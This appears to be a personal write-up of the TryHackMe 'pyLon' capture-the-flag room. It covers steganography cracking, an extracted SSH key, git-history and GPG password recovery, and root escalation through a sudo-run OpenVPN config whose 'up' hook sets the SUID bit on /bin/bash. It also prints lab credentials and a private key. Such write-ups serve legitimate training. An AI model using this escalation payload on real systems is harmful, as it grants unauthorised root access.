<p>July 14, 2025 - Day 434</p>
<h1>pyLon</h1>
<p><em>Can you penetrate the defenses and become root?</em><br>
https://tryhackme.com/room/pylonzf</p>

<br>

<img width="1889" height="383" alt="image" src="https://github.com/user-attachments/assets/86a94a79-51c1-463d-82ca-6d49028bd9c2" />


<h2 align="center">nmap</h3>

```bash
:~/pyLon# nmap -sC -sV -Pn -p- -T4 xx.xxx.xx.xx
...
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
...
222/tcp open  ssh     OpenSSH 8.4 (protocol 2.0)
```

<h2 align="center">/etc/hosts</h3>

```bash
xx.xxx.xx.xx  pylon.thm
```

<h2 align="center">file</h2>

```bash
:~/pyLon# file pepper.jpg
pepper.jpg: JPEG image data, baseline, precision 8, 2551x1913, components 3
```

<h2 align="center">stegseek</h2>

```bash
:~/pyLon# stegseek --crack pepper.jpg /usr/share/wordlists/rockyou.txt
...
[i] Found passphrase: "pepper"           
[i] Original filename: "lone".
[i] Extracting to "pepper.jpg.out".
```

<h2 align="center">steghide</h2>

```bash
:~/pyLon# steghide extract -sf pepper.jpg
Enter passphrase:
wrote extracted data to "lone".
```

<h2 align="center">file</h2>

```bash
:~/pyLon# file lone
lone: ASCII text
```

<h2 align="center">lone</h2>

```bash
:~/pyLon# cat lone
H4sIAAAAAAAAA+3Vya6zyBUA4H/NU9w9ilxMBha9KObZDMY2bCIGG2MmMw9P39c3idRZtJJNK4rE
J6FT0imkoupQp2zq+9/z9NdfCXyjafoTMZoCf4wfBEnQvzASAJKkAX7EfgEMo2jw6wv8pav6p7Ef
ou7r69e7aVKQ/fm8/5T/P/W3D06UVevrZIuW5ylftqte4Fn80sXgJ4vEBFfGtbVFPNaFt2JIXyL8
4GRqiiv/MxTjih1DB/4L93mk+TNMtwTPhqRGrOdPav5++TPRESFJ1ZenOJwJutdri7sq+CXob/EL
MhPUmTsglUeXSeBo5bLs9C5nDNqMBNpIE+gmnwBsxHPDGMFz4ai7SgmsvsWNPJ4FOMqhM/otyliH
J1c9oim/K4aSFa7FdUDstCNASlyCiXA9voVmfuQzj019mi/O0WCK6fJMiw3I/sOG5UN1n4oyOJFT
O/Rcu0Mqv1RbZw8eZto9omonQ8A9mrUWj56ycWZo8w2S2n0JURnxiSsC0fAnQ9CdNCyvcQQK6WAn
eVvUhRC0eBUXvJsixOt6w/1qAdfBxmf+yXLOoV+Xsybc6mPFi31jqYeuMfSVw0a56g9vKecWD7Rp
HkJ4OvLruVhl5BnOMcbplf/ZeebprXXL+v37ODl/PImfg+CgI7yq9Cp6mP0Y5zYBUvAIL/mSjogp
rAzsFvqcpegIb+cGV4OQX0RxBDWXVfT0oM2AdvjMPb3mIVdEpSRfhQ06a8wiyjR5Mix5CvE6eiZQ
UQ7ZFtXIpL/z37shT47X1513C3xutuK2OL041IDGFV1wQxKaafXYq4SfbSd0GYa/MMhTFpM7xr35
VJj4VMZAZGZMR7CGP6NzVpC9HRoTICRjRHla2Pq1dtdUNq320miLeHacwWN6E3lzWHUJh85zbgy7
6q13d6y8i8LR0STiboWP0IsVNwKHGOoKkAR0MySzsO6PNlC9NQMvdMz6DlGVKxlFG1pcVUUyvDeu
FRDSjaGdzmok1dzki214/vdK59ARED4ubo92a7nXAEuk37Zu4EzGSKfb8wTl1xltpoJXqmO/rvm6
JJFNhRtBfZcbnYpKbKWkeNZEIT1Lgfu++TEL5NxHejl4a8G11qbyVnUqIbDtaZvaLKjR5WZFYcpe
UOo8q/b3B3P4ukhG7kji+IKR63f4NbDrkGh8hA+dE31v2nvmSBUl3YwVbCW4l7AQc6Hr3h7FW9xY
TzhL14ppSJytihxOYKYVB6ZwB55PAstBrlAWjTSHDpvT1sEzX1AL4AU34SuOtzc16oJvLTEBa4bq
/Kuu3PoSnoUnTkWxGoBIDhXDphaE/K7xvrJtY5HP7Q1j+epIDcXM5C/zCE0WXcmz9cJzQi6dzz0D
M0ewUPyYl8Kgq1VncxMKiwwZXr1uGABQrmEPugPLug0ermZji6HrG90kQTqWUVCBfm36AE0idYOX
xDqWtdRw3XYOcWKcV+TCgbB3jQObdOss1ewCRdab4vrILzIXOJfTcbnwb1TO1ZsTKu+A5s0Ll0Lr
eRC1Sn7w2iGT4xWpxoEeT9fqkWufNasiZKOCjSY6GOurUQvvY7j6j8iFTeLZy/BdLAz6OlZoNgf9
gE5MYmi4pyHp2IIh2+gtYmar8y0iu8FM2DLy0nO+bnhETmJPTKiy1hcp75op3VPVZhYa2KMhg7Gy
/YI7AMQDjunX2HEivcOjVrIwoHRB90ry6XZ3Kl67PrrooCnHXO+b0SU/Fz7PwRMYIa5OZeQn3r3j
EXAyC9NgCzmE9AgpXNFdNhQPHKm4rOPoFtmHaHayH7mTjHoQCd2jcvm7kabdoI5lG5BRdUlcpF6I
Efe4hdXN49hCfGaAX7ZazHCX1SS9PvEbJa3iNmGvC/VAa5mCMSPadgsky+62jtNsqgIISRSJkRp3
RpsO4vnx8xPyBEfFMjs6yj8idFSBg77Mzb/9hvy0N9ES/rz1/a/b82632+12u91ut9vtdrvdbrfb
7Xa73W632+12/5XfActiLj0AKAAA
```

<h2 align="center">exiftool</h2>
<p>

- Subject                         : https://gchq.github.io/CyberChef/#recipe=To_Hex('None',0)To_Base85('!-u',false)<br>  
- Encoding Process                : Baseline DCT, Huffman coding<br>
</p>

```bash
:~/pyLon# exiftool pepper.jpg
ExifTool Version Number         : 12.76
File Name                       : pepper.jpg
Directory                       : .
File Size                       : 390 kB
File Modification Date/Time     : 2025:07:14 18:11:49-03:00
File Access Date/Time           : 2025:07:14 18:17:51-03:00
File Inode Change Date/Time     : 2025:07:14 18:11:49-03:00
File Permissions                : -rwxrwxrwx
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
XMP Toolkit                     : Image::ExifTool 12.16
Subject                         : https://gchq.github.io/CyberChef/#recipe=To_Hex('None',0)To_Base85('!-u',false)
Image Width                     : 2551
Image Height                    : 1913
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 2551x1913
Megapixels                      : 4.9
```

<h2 align="center">CyberChef</h2>

<img width="1354" height="438" alt="image" src="https://github.com/user-attachments/assets/bd635d1f-87e2-4ea2-98b7-0a98b1a7bd2c" />


<h2 align="center">Base64 decoded</h3>

```bash
:~/pyLon# base64 -d lone > lodeBase64decoded
```

<h2 align="center">file</h3>

```bash
:~/pyLon# file loneBase64decoded
loneBase64decoded: gzip compressed data, from Unix, original size modulo 2^32 10240
```

<h3 align="center">mv</h3>

```bash
:~/pyLon# mv loneBase64decoded lone.gz
```

<h3 align="center">file</h3>

```bash
:~/pyLon# file lone
lone: POSIX tar archive (GNU)
```

<h3 align="center">tar</h3>

```bash
:~/pyLon# mv loneBase64decoded lone.gz
```

<h2 align="center">lone_id</h2>

```bash
:~/pyLon# cat lone_id
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEA45nVhEtT37sKnNBWH2VYsXbjA8vAK8e04HfrgF06NiGGQsRBLtJw
YJu73+zGO0AoETo8LYhxB5eI5D9KzboGuTDAuGZQuUq+8N/hBmfavieHLHgkRNBr0ErJ60
l2FAcDW6pDowfiwC1vsdixQ6L8kvVhdkz0GUfPAlfIRhHHtQaQnQ7wnRtdGjIPK9/S1MPs
IJOLD2S79NxS7vguw87Mp0cnRjDalaCcRE0ELUvLDKQdZlWba0kF/PciqknkDYq2mbkCRd
3jWX2Umx0WtP2wCh9BQ/syxTJDXn6mCEsoNI/roLKyB1uGms/pFiBxS0qdiZAAO6CyTkyG
hZwb1BKmUwAAA8hSynq9Usp6vQAAAAdzc2gtcnNhAAABAQDjmdWES1Pfuwqc0FYfZVixdu
MDy8Arx7Tgd+uAXTo2IYZCxEEu0nBgm7vf7MY7QCgROjwtiHEHl4jkP0rNuga5MMC4ZlC5
Sr7w3+EGZ9q+J4cseCRE0GvQSsnrSXYUBwNbqkOjB+LALW+x2LFDovyS9WF2TPQZR88CV8
hGEce1BpCdDvCdG10aMg8r39LUw+wgk4sPZLv03FLu+C7DzsynRydGMNqVoJxETQQtS8sM
pB1mVZtrSQX89yKqSeQNiraZuQJF3eNZfZSbHRa0/bAKH0FD+zLFMkNefqYISyg0j+ugsr
IHW4aaz+kWIHFLSp2JkAA7oLJOTIaFnBvUEqZTAAAAAwEAAQAAAQB+u03U2EzfqzqBjtAl
szzrtBM8LdvXhOAGjT+ovkCHm6syyiyxcaP5Zz35tdG7dEHbNd4ETJEDdTFYRpXUb90GiU
sGYpJYWnJvlXmrI3D9qOzvqgYn+xXNaZd9V+5TwIPyKqB2yxFLiQFEujAaRUr2WYPnZ3oU
CZQO7eoqegQFm5FXLy0zl0elAkEiDrrpS5CNBunv297nHMLFBPIEB231MNbYMDe0SU40NQ
WAGELdiAQ9i7N/SMjAJYAV2MAjbbzp5uKDUNxb3An85rUWKHXslATDh25abIY0aGZHLP5x
4B1usmPPLxGTqX19Cm65tkw8ijM6AM9+y4TNj2i3GlQBAAAAgQDN+26ilDtKImrPBv+Akg
tjsKLL005RLPtKQAlnqYfRJP1xLKKz7ocYdulaYm0syosY+caIzAVcN6lnFoBrzTZ23uwy
VB0ZsRL/9crywFn9xAE9Svbn6CxGBYQVO6xVCp+GiIXQZHpY7CMVBdANh/EJmGfCJ/gGby
mut7uOWmfiJAAAAIEA9ak9av7YunWLnDp6ZyUfaRAocSPxt2Ez8+j6m+gwYst+v8cLJ2SJ
duq0tgz7za8wNrUN3gXAgDzg4VsBUKLS3i41h1DmgqUE5SWgHrhIJw9AL1fo4YumPUkB/0
S0QMUn16v4S/fnHgZY5KDKSl4hRre5byrsaVK0oluiKsouR4EAAACBAO0uA2IvlaUcSerC
0OMkML9kGZA7uA52HKR9ZE/B4HR9QQKN4sZ+gOPfiQcuKYaDrfmRCeLddrtIulqY4amVcR
nx3u2SBx9KM6uqA2w80UlqJb8BVyM4SscUoHdmbqc9Wx5f+nG5Ab8EPPq0FNPrzrBJP5m0
43kcLdLe8Jv/ETfTAAAAC3B5bG9uQHB5bG9uAQIDBAUGBw==
-----END OPENSSH PRIVATE KEY-----
```

<h2 align="center">SSH</h2>

```bash
:~/pyLon# chmod 600 lone_id
```

```bash
:~/pyLon# ssh -i lone_id lone@pylon.thm -p 222
```

```bash
:~/pyLon# ssh -i lone_id lone@pylon.thm -p 222
```

<h3>key</h3>
<p>2_[-I2_[0E2DmEK</p>

<img width="981" height="288" alt="image" src="https://github.com/user-attachments/assets/b35d2951-245e-4c62-ba4c-f29b3a689737" />

<img width="984" height="216" alt="image" src="https://github.com/user-attachments/assets/949de306-990a-4e2f-a3cd-dacd571cc6c9" />


<p>2</p>

<img width="985" height="244" alt="image" src="https://github.com/user-attachments/assets/dbd4ef61-401e-466e-aeab-bcfa3b3547e5" />

```bash

:~/pyLon#
               
                  /               
      __         /       __    __
    /   ) /   / /      /   ) /   )
   /___/ (___/ /____/ (___/ /   /
  /         /                     
 /      (_ /  pyLon Password Manager
                   by LeonM

    Password for pylon.thm

        Username = lone
        Password = +2BRkRuE!w7>ozQ4            

Press ENTER to continue.
```

<h3>ssh</h3>

```bash
$ ssh lone@TargetIP
...
lone@pylon:~$ id
uid=1002(lone) gid=1002(lone) groups=1002(lone)
lone@pylon:~$ cd /home
lone@pylon:/home$ ls
lone  pood  pylon
lone@pylon:/home$ cd lone
lone@pylon:~$ ls -la
total 48
drwxr-x--- 6 lone lone 4096 Jan 30  2021 .
drwxr-xr-x 5 root root 4096 Jan 30  2021 ..
lrwxrwxrwx 1 lone lone    9 Jan 30  2021 .bash_history -> /dev/null
-rw-r--r-- 1 lone lone  220 Jan 30  2021 .bash_logout
-rw-r--r-- 1 lone lone 3771 Jan 30  2021 .bashrc
drwx------ 2 lone lone 4096 Jan 30  2021 .cache
-rw-rw-r-- 1 lone lone   44 Jan 30  2021 .gitconfig
drwx------ 4 lone lone 4096 Jan 30  2021 .gnupg
drwxrwxr-x 3 lone lone 4096 Jan 30  2021 .local
-rw-r--r-- 1 lone lone  807 Jan 30  2021 .profile
-rw-rw-r-- 1 pood pood  600 Jan 30  2021 note_from_pood.gpg
drwxr-xr-x 3 lone lone 4096 Jan 30  2021 pylon
-rw-r--r-- 1 lone lone   18 Jan 30  2021 user1.txt
lone@pylon:~$ cat user1.txt
TMM{easy_does_it}
```

<h3>note_from_pood.gpg</h3>

```bash
lone@pylon:~$ file note_from_pood.gpg
note_from_pood.gpg: PGP RSA encrypted session key - keyid: A7A53FD8 57FE0F16 RSA (Encrypt or Sign) 3072b .
```


<h3>/etc/passwd</h3>

```bash
lone@pylon:~$ cat /etc/passwd | grep "\/home"
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
pylon:x:1000:1000:pylon:/home/pylon:/bin/bash
pood:x:1001:1001:poo D,,,:/home/pood:/bin/bash
lone:x:1002:1002:lon E,,,:/home/lone:/bin/bash
```

<h3>sudo -l</h3>

```bash
lone@pylon:~$ sudo -l
[sudo] password for lone: 
Matching Defaults entries for lone on pylon:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lone may run the following commands on pylon:
    (root) /usr/sbin/openvpn /opt/openvpn/client.ovpn
```

<h3>pylon</h3>

```bash
lone@pylon:~$ pwd
/home/lone
lone@pylon:~$ ls
note_from_pood.gpg  pylon  user1.txt
lone@pylon:~$ cd pylon
lone@pylon:~/pylon$ ls
README.txt  banner.b64  pyLon.py  pyLon_crypt.py  pyLon_db.py
lone@pylon:~/pylon$ ls -lah
total 52K
drwxr-xr-x 3 lone lone 4.0K Jul 14 22:11 .
drwxr-x--- 6 lone lone 4.0K Jan 30  2021 ..
drwxrwxr-x 8 lone lone 4.0K Jul 14 22:11 .git
-rw-rw-r-- 1 lone lone  793 Jan 30  2021 README.txt
-rw-rw-r-- 1 lone lone  340 Jan 30  2021 banner.b64
-rw-rw-r-- 1 lone lone  12K Jul 14 22:11 pyLon.db
-rw-rw-r-- 1 lone lone 2.5K Jul 14 22:09 pyLon_crypt.py
-rw-rw-r-- 1 lone lone 3.9K Jan 30  2021 pyLon_db.py
-rw-rw-r-- 1 lone lone  11K Jul 14 22:11 pyLon_pwMan.py
```

<h3>.git</h3>

```bash
lone@pylon:~/pylon$ cd .git
lone@pylon:~/pylon/.git$ ls
COMMIT_EDITMSG  HEAD  branches  config  description  hooks  index  info  logs  objects  refs
```

<h3>git log</h3>

```bash
lone@pylon:~/pylon/.git$ git log
commit 73ba9ed2eec34a1626940f57c9a3145f5bdfd452 (HEAD, master)
Author: lone <lone@pylon.thm>
Date:   Sat Jan 30 02:55:46 2021 +0000

    actual release! whoops

commit 64d8bbfd991127aa8884c15184356a1d7b0b4d1a
Author: lone <lone@pylon.thm>
Date:   Sat Jan 30 02:54:00 2021 +0000

    Release version!

commit cfc14d599b9b3cf24f909f66b5123ee0bbccc8da
Author: lone <lone@pylon.thm>
Date:   Sat Jan 30 02:47:00 2021 +0000

    Initial commit!
```

<h3>git show</h3>


```bash
$ git show 64d8bbfd991127aa8884c15184356a1d7b0b4d1a
commit 64d8bbfd991127aa8884c15184356a1d7b0b4d1a
Author: lone <lone@pylon.thm>
Date:   Sat Jan 30 02:54:00 2021 +0000

    Release version!

diff --git a/pyLon.db b/pyLon.db
deleted file mode 100644
index 68d04e0..0000000
Binary files a/pyLon.db and /dev/null differ
diff --git a/pyLon_pwMan.py b/pyLon.py
similarity index 100%
rename from pyLon_pwMan.py
rename to pyLon.py
lone@pylon:~/pylon/.git$ git show cfc14d599b9b3cf24f909f66b5123ee0bbccc8da
commit cfc14d599b9b3cf24f909f66b5123ee0bbccc8da
Author: lone <lone@pylon.thm>
Date:   Sat Jan 30 02:47:00 2021 +0000

    Initial commit!

diff --git a/README.txt b/README.txt
new file mode 100644
index 0000000..45e699d
--- /dev/null
+++ b/README.txt
@@ -0,0 +1,29 @@
+                  /^M
+      __         /       __    __^M
+    /   ) /   / /      /   ) /   )^M
+   /___/ (___/ /____/ (___/ /   /^M
+  /         /^M
+ /      (_ /  pyLon Password Manager^M
+                   by LeonM^M
+^M
+^M
+This program was designed to run in a terminal, it should run in IDLE^M
+but may not function fully as intended, for example the encryption key^M
+will not be hidden in IDLE as you type.^M
+^M
+the database is created in the current working directory not the directory^M
+of the program, so run it from where you want the database stored.^M
+^M
+to run:^M
+^M
+windows:^M
+c:\CWD> c:\path\to\python.exe pyLon_pwMan.py^M
+^M
+linux:^M
+~\pyLon$ python3 pyLon_pwMan.py^M
+^M
+To use the copy to clipboard function in linux you must install xclip^M
+^M
+$ sudo apt install xclip^M
+^M
+That is all, please enjoy this app.
\ No newline at end of file
diff --git a/banner.b64 b/banner.b64
new file mode 100644
index 0000000..c7287b0
--- /dev/null
+++ b/banner.b64
@@ -0,0 +1 @@
+ICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgIC8gICAgICAgICAgICAgICAKICAgICAgX18gICAgICAgICAvICAgICAgIF9fICAgIF9fCiAgICAvICAgKSAvICAgLyAvICAgICAgLyAgICkgLyAgICkKICAgL19fXy8gKF9fXy8gL19fX18vIChfX18vIC8gICAvCiAgLyAgICAgICAgIC8gICAgICAgICAgICAgICAgICAgICAKIC8gICAgICAoXyAvICBweUxvbiBQYXNzd29yZCBNYW5hZ2VyCiAgICAgICAgICAgICAgICAgICBieSBMZW9uTQo=
\ No newline at end of file
diff --git a/pyLon.db b/pyLon.db
new file mode 100644
```



<h3>git checkout</h3>

```bash
lone@pylon:~/pylon/.git$ cd ..
lone@pylon:~/pylon$ ls
README.txt  banner.b64  pyLon.py  pyLon_crypt.py  pyLon_db.py
lone@pylon:~/pylon$ git checkout cfc14d599b9b3cf24f909f66b5123ee0bbccc8da
Previous HEAD position was 73ba9ed actual release! whoops
HEAD is now at cfc14d5 Initial commit!
lone@pylon:~/pylon$ git checkout 64d8bbfd991127aa8884c15184356a1d7b0b4d1a
Previous HEAD position was cfc14d5 Initial commit!
HEAD is now at 64d8bbf Release version!
lone@pylon:~/pylon$ git checkout cfc14d599b9b3cf24f909f66b5123ee0bbccc8da
Previous HEAD position was 64d8bbf Release version!
HEAD is now at cfc14d5 Initial commit!
```

<h3>pyLon.db</h3>

```bash
lone@pylon:~/pylon$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
xx.xx.xxx.xxx - - [14/Jul/2025 xx:xx:xx] "GET /pyLon.db HTTP/1.1" 200 -
```

```bash
:~/pyLon# wget http://TargetIP:8000/pyLon.db
```

<h3>sqlite3</h3>

```bash
:~/pyLon# file pyLon.db
pyLon.db: SQLite 3.x database, last written using SQLite version 3022000
:~/pyLon# sqlite3 pyLon.db
SQLite version 3.31.1 2020-01-27 19:55:54
Enter ".help" for usage hints.
sqlite> .databases
main: /root/pyLon/pyLon.db
sqlite> .tables
pwCheck  pwMan  
sqlite> SELECT * FROM pwMan;
pylon.thm_gpg_key|lone_gpg_key|
sqlite> SELECT * FROM pwCheck;
fc37a9f7a6115a98d549b52a42c8e3a9a83849edbb448b4fbd787be41c12062f1505a23f07b850e578d8932769f232c8b4e7f2148762025a47952440a58ce3db
```


<h3>hashid</h3>

```bash
:~/pyLon# hashid -j fc37a9f7a6115a98d549b52a42c8e3a9a83849edbb448b4fbd787be41c12062f1505a23f07b850e578d8932769f232c8b4e7f2148762025a47952440a58ce3db
Analyzing 'fc37a9f7a6115a98d549b52a42c8e3a9a83849edbb448b4fbd787be41c12062f1505a23f07b850e578d8932769f232c8b4e7f2148762025a47952440a58ce3db'
[+] SHA-512 [JtR Format: raw-sha512]
[+] Whirlpool [JtR Format: whirlpool]
[+] Salsa10 
[+] Salsa20 
[+] SHA3-512 [JtR Format: raw-keccak]
[+] Skein-512 [JtR Format: skein-512]
[+] Skein-1024(512) 
:~/pyLon# hashid -j 40703ac897fd8cfdffc97947981e88a1
Analyzing '40703ac897fd8cfdffc97947981e88a1'
[+] MD2 [JtR Format: md2]
[+] MD5 [JtR Format: raw-md5]
[+] MD4 [JtR Format: raw-md4]
[+] Double MD5 
[+] LM [JtR Format: lm]
[+] RIPEMD-128 [JtR Format: ripemd-128]
[+] Haval-128 [JtR Format: haval-128-4]
[+] Tiger-128 
[+] Skein-256(128) 
[+] Skein-512(128) 
[+] Lotus Notes/Domino 5 [JtR Format: lotus5]
[+] Skype 
[+] Snefru-128 [JtR Format: snefru-128]
[+] NTLM [JtR Format: nt]
[+] Domain Cached Credentials [JtR Format: mscach]
[+] Domain Cached Credentials 2 [JtR Format: mscach2]
[+] DNSSEC(NSEC3) 
[+] RAdmin v2.x [JtR Format: radmin]
```


<h3>John The Ripper</h3>

```bash
:~/pyLon# cat hash
fc37a9f7a6115a98d549b52a42c8e3a9a83849edbb448b4fbd787be41c12062f1505a23f07b850e578d8932769f232c8b4e7f2148762025a47952440a58ce3db
```

```bash
:~/pyLon# john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-sha512 hash
```

<p>did not work</p>

<h3>pyLon_pwMan.py</h3>

```bash
lone@pylon:~/pylon$ python3 pyLon_pwMan.py
```

<p>2_[-I2_[0E2DmEK</p>

```bash
                  /               
      __         /       __    __
    /   ) /   / /      /   ) /   )
   /___/ (___/ /____/ (___/ /   /
  /         /                     
 /      (_ /  pyLon Password Manager
                   by LeonM

  
        [1] List passwords.
        [2] Decrypt a password.
        [3] Create new password.
        [4] Delete a password.
        [5] Search passwords.
        [6] Display help menu
        

Select an option [Q] to Quit: 
```


<p>2</p>

```bash
                  /               
      __         /       __    __
    /   ) /   / /      /   ) /   )
   /___/ (___/ /____/ (___/ /   /
  /         /                     
 /      (_ /  pyLon Password Manager
                   by LeonM

    Password for pylon.thm_gpg_key

        Username = lone_gpg_key
        Password = zr7R0T]6zvYl*~OD            

[*] Install xclip to copy to clipboard.
[*] sudo apt install xclip

[*] Password copied to the clipboard.

Press ENTER to continue.
```

<p>zr7R0T]6zvYl*~OD</p>


<h3>note_from_pood.gpg</h3>

```bash
lone@pylon:~$ gpg -d note_from_pood.gpg
```

<img width="896" height="251" alt="image" src="https://github.com/user-attachments/assets/53b2b3ab-6ecd-4663-bdac-3e91ce1ca774" />

```bash
lone@pylon:~$ gpg -d note_from_pood.gpg
gpg: Note: secret key D83FA5A7160FFE57 expired at Fri Jan 27 19:13:48 2023 UTC
gpg: encrypted with 3072-bit RSA key, ID D83FA5A7160FFE57, created 2021-01-27
      "lon E <lone@pylon.thm>"
Hi Lone,

Can you please fix the openvpn config?

It's not behaving itself again.

oh, by the way, my password is yn0ouE9JLR3h)`=I

Thanks again.
```

<h3>su pood</h3>

```bash
lone@pylon:~$ su pood
Password: 
pood@pylon:/home/lone$ cd ..
pood@pylon:/home$ cd pood
pood@pylon:~$ ls -la
total 36
drwxr-x--- 5 pood pood 4096 Jan 30  2021 .
drwxr-xr-x 5 root root 4096 Jan 30  2021 ..
lrwxrwxrwx 1 pood pood    9 Jan 30  2021 .bash_history -> /dev/null
-rw-r--r-- 1 pood pood  220 Jan 30  2021 .bash_logout
-rw-r--r-- 1 pood pood 3771 Jan 30  2021 .bashrc
drwx------ 2 pood pood 4096 Jan 30  2021 .cache
drwx------ 4 pood pood 4096 Jan 30  2021 .gnupg
drwxr-xr-x 3 pood pood 4096 Jan 30  2021 .local
-rw-r--r-- 1 pood pood  807 Jan 30  2021 .profile
-rw-rw-r-- 1 pood pood   29 Jan 30  2021 user2.txt
pood@pylon:~$ cat user2.txt
THM{homebrew_encryption_lol}
```

<h3>sudo -l</h3>

```bash
pood@pylon:~$ sudo -l
[sudo] password for pood: 
Matching Defaults entries for pood on pylon:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pood may run the following commands on pylon:
    (root) sudoedit /opt/openvpn/client.ovpn
```

<h3>sudo -l</h3>

```bash
pood@pylon:~$ sudo -l
[sudo] password for pood: 
Matching Defaults entries for pood on pylon:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pood may run the following commands on pylon:
    (root) sudoedit /opt/openvpn/client.ovpn
```

<h3>client.ovpn</h3>

```bash
pood@pylon:~$ sudoedit /opt/openvpn/client.ovpn
```

<img width="977" height="242" alt="image" src="https://github.com/user-attachments/assets/edaa3c79-d8ac-439d-8e43-e57b77f8c0a4" />


```bash
client
dev tun
script-securit 2
up "/bin/chmod +s /bin/bash" 
proto udp
```


<h3>client.ovpn</h3>

```bash
pood@pylon:~$ exit
exit
lone@pylon:~$ sudo /usr/sbin/openvpn /opt/openvpn/client.ovpn
```


```bash
lone@pylon:/tmp$ sudo /usr/sbin/openvpn /opt/openvpn/client.ovpn
Tue Jul 15 00:02:21 2025 OpenVPN 2.4.4 x86_64-pc-linux-gnu [SSL (OpenSSL)] [LZO] [LZ4] [EPOLL] [PKCS11] [MH/PKTINFO] [AEAD] built on May 14 2019
Tue Jul 15 00:02:21 2025 library versions: OpenSSL 1.1.1  11 Sep 2018, LZO 2.08
Tue Jul 15 00:02:21 2025 NOTE: the current --script-security setting may allow this configuration to call user-defined scripts
Tue Jul 15 00:02:21 2025 WARNING: Your certificate has expired!
Tue Jul 15 00:02:21 2025 TCP/UDP: Preserving recently used remote address: [AF_INET]127.0.0.1:1194
Tue Jul 15 00:02:21 2025 UDP link local: (not bound)
Tue Jul 15 00:02:21 2025 UDP link remote: [AF_INET]127.0.0.1:1194
```

```bash
lone@pylon:/tmp$ ls -la
total 52
drwxrwxrwt 10 root root 4096 Jul 14 23:28 .
drwxr-xr-x 24 root root 4096 Mar 30  2021 ..
drwxrwxrwt  2 root root 4096 Jul 14 21:42 .ICE-unix
drwxrwxrwt  2 root root 4096 Jul 14 21:42 .Test-unix
drwxrwxrwt  2 root root 4096 Jul 14 21:42 .X11-unix
drwxrwxrwt  2 root root 4096 Jul 14 21:42 .XIM-unix
drwxrwxrwt  2 root root 4096 Jul 14 21:42 .font-unix
-rw-rw-r--  1 lone lone   53 Jul 14 23:28 bash
...
lone@pylon:/tmp$ bash -p
```

```bash
lone@pylon:/tmp$ openssl passwd -6 -salt abc password
$6$abc$rvqzMBuMVukmply9mZJpW0wJMdDfgUKLDrSNxf9l66h/ytQiKNAdqHSj5YPJpxWJpVjRXibQXRddCl9xYHQnd0

```

<br>
<br>

<h1 align="center">My TryHackMe Journey</h1>

<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
| July 14, 2025     | 433      |     159ᵗʰ    |      5ᵗʰ     |    192nd    |     8ᵗʰ    |  114,735 |    855    |     64    |

</div>


<img width="329" height="88" alt="image" src="https://github.com/user-attachments/assets/fd1ae2cb-879a-4e9f-9e38-784952da9370" />

<img width="1892" height="895" alt="image" src="https://github.com/user-attachments/assets/ef2d3d02-420f-4ead-81a4-e79fb979a64b" />

<img width="1890" height="895" alt="image" src="https://github.com/user-attachments/assets/765bf4c1-4c7c-498a-b486-0c76f1ef34ba" />

<img width="1898" height="892" alt="image" src="https://github.com/user-attachments/assets/f7bd74a7-5a3d-46a5-9d74-7dd01e03f14b" />

<img width="1892" height="890" alt="image" src="https://github.com/user-attachments/assets/efd42a69-dcb0-4233-a2fb-8babdfb9323f" />
